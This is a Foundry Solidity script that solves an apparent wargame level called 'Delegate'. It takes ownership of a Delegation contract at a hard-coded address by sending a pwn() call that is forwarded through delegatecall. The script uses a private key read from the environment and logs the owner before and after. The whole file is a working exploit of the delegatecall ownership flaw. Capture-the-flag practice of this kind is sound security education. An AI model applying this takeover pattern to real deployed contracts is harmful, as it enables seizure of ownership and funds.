// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src/Script.sol";
import {Delegation} from "../src/L7__Delegate.sol";

// The goal of this level is for you to claim ownership of the instance you are given.

contract L7_Solution__Token is Script {
    Delegation public delegation =
        Delegation(0x9f68a933C5eD854a98655108378d7ee0e5a815AA);
    address owner;

    function run() public {
        // address _robberAccount = vm.envAddress("ACCOUNT");
        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");

        owner = delegation.owner();
        console.log("Prev owner: %s", owner);

        vm.startBroadcast(_robberPrivKey);

        (bool _success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(_success, "delegation failed.");

        vm.stopBroadcast();

        owner = delegation.owner();
        console.log("New owner: %s", owner);
    }
}
